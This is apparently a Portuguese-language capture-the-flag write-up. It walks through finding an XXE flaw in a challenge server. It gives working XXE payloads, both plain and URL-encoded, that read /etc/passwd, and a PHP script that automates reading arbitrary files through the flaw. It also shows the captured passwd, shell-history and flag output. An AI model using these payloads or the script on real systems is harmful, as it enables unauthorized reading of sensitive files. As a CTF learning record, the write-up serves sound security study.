root@darkcode0x00:~# curl http://142.93.73.149:12321/?xml="<script>Waiting for the Sunrise</script>"
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 400.
<p>Message: Bad request syntax ('GET /?xml=&lt;script&gt;Waiting for the Sunrise&lt;/script&gt; HTTP/1.1').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body> 
```
> nessa última requisição  utilizando o parâmetro xml com tags percebemos que ele dá um erro de bad request porem retorna 
>&lt fazendo referência a um xml, foi aí que eu saquei que poderia ser um xml, no próximo passo vou verificar o header
## Quarto passo burp
![img](https://github.com/darkcode357/ctf_critical/blob/master/Screenshot%20from%202019-11-15%2017-05-31.png?raw=true)
![img](https://github.com/darkcode357/ctf_critical/blob/master/Screenshot%20from%202019-11-15%2017-10-40.png?raw=true)
>percebemos que o header é mal configurado permitindo alterações
>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>tendo suporte a xhtml+xml 

>de acordo com os headers do burp falando que poderia ser um xss, validando o xss na função strip na div te pensei ser algo em xml
>descobri a vulnerabilidade xxe, porem pensei que essa vuln era apena em método post, pois testei a vuln no lab do burpsuite
>[link lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files), porem após vários testes em labs 
>tentei fazer via get

> o primeiro modelo de request que eu fiz foi esse 

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>
```
>seguindo o exemplo do lab do burp 
>porem não deu certo em texto plano logo tentei fazer o encode da url 
>%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20test%20%5B%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%20%5D%3E%0A%3CstockCheck%3E%3CproductId%3E1%3C%2FproductId%3E%3CstoreId%3E2%3C%2FstoreId%3E%3C%2FstockCheck%3E
> e consegui a seguinte reposta

```bash

curl http://142.93.73.149:12321/?xml=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20test%20%5B%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%20%5D%3E%0A%3CstockCheck%3E%3CproductId%3E1%3C%2FproductId%3E%3CstoreId%3E2%3C%2FstoreId%3E%3C%2FstockCheck%3E

<stockCheck>
  <productId>1</productId>
  <storeId>2</storeId>
</stockCheck>
```
>ai foi quando eu percebi que realmente era uma falha de xxe, foi quando eu melhorei o meu payload

```bash
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE darkcodexxe [ <!ELEMENT darkcodexxe ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><darkcodexxe>&xxe;</darkcodexxe>
deu certo porem via texto plano não iria dá certo então encodei novamente
```
![payload](https://github.com/darkcode357/ctf_critical/blob/master/Screenshot%20from%202019-11-15%2017-28-33.png?raw=true)

> para não ficar perdendo tempo, eu criei um script em php para me ajudar 
```php
<?php
$ls = $_REQUEST['ls'];

function ls($path){
    $cmd = "file%3A%2F%2F%2F".urlencode($path);
    $command = file_get_contents("http://142.93.73.149:12321/?xml=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C!DOCTYPE%20foo%20[%20%3C!ELEMENT%20foo%20ANY%20%3E%20%3C!ENTITY%20xxe%20SYSTEM%20%22{$cmd}%22%20%3E]%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E");
    return $command;
}

echo ls($ls);
?>

```
> para ficar fazendo todas as request para min 
>como usar view-source:http://localhost/?ls=etc/passwd
>e foi desse jeito que eu peguei a flag
>analisando o /etc/passwd,e o /etc/shells


```bash

<!DOCTYPE darkcodexxe [
<!ELEMENT darkcodexxe ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<darkcodexxe>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
criticalsec:x:1000:1000::/home/criticalsec:/bin/bash
</darkcodexxe>



<!DOCTYPE darkcodexxe [
<!ELEMENT darkcodexxe ANY>
<!ENTITY xxe SYSTEM "file:///etc/shells">
]>
<darkcodexxe># /etc/shells: valid login shells
/bin/sh
/bin/bash
/bin/rbash
/bin/dash
</darkcodexxe>


```
> reparei que ele tinha um user, e como eu não tinha acesso a nenhum comando remoto, eu resolvi ler os arquivos do user como eu já sabia que 
>ele tinha um bash resolvi ler os arquivos do bash (.bash_history  .bash_logout   .bashrc)

```bash
view-source:http://localhost/?ls=/home/criticalsec/.bash_history

<!DOCTYPE darkcodexxe [
<!ELEMENT darkcodexxe ANY>
<!ENTITY xxe SYSTEM "file:////home/criticalsec/.bash_history">
]>
<darkcodexxe>ls
cd ..
ls
ls
history
ls
cd ..
ls
cd ~
ls
history
ls
ls
cd ..
ls
history
ls
cd ..
ls
ls
history
ls
ls
cd ..
ls
ls
history
ls
ls
history
ls
cd ..
ls
cd ..
ls
cd /home
ls
cd criticalsec
ld
ls -lha 03e76a01ef5fd73eb36e4326926df7cb_flag.txt
ls
cd ..
ls
ls
cd ..
cd ..
ls
cd ..
ls
cd ..
ll
ls
cd /var/
ls
cd www/
ls
cd ..
cd log
ls
cd apt/
ls
cat history.log 
cd ..
ls
cd ..
ls
cd cache/
ls
cd ..
ls
cd backups/
ls
cd ..
cd cache/
ls
cd ..
ls
cd home/
ls
cd criticalsec/
ls
cd ..
cd /var/www/
ls
cd html/
ls
ps aux
</darkcodexxe>
```
> Avistei a flag a flag

```bash
view-source:http://localhost/?ls=/home/criticalsec/03e76a01ef5fd73eb36e4326926df7cb_flag.txt


<!DOCTYPE darkcodexxe [
<!ELEMENT darkcodexxe ANY>
<!ENTITY xxe SYSTEM "file:////home/criticalsec/03e76a01ef5fd73eb36e4326926df7cb_flag.txt">
]>
<darkcodexxe>
Parabéns!

Entre em contato conosco pelo email talentos.criticalsec@gmail.com com a tag [ACME] no assunto,
explicando como chegou no resultado.


(Criado por j3r3mias)
</darkcodexxe>
```
> Fim da ctf
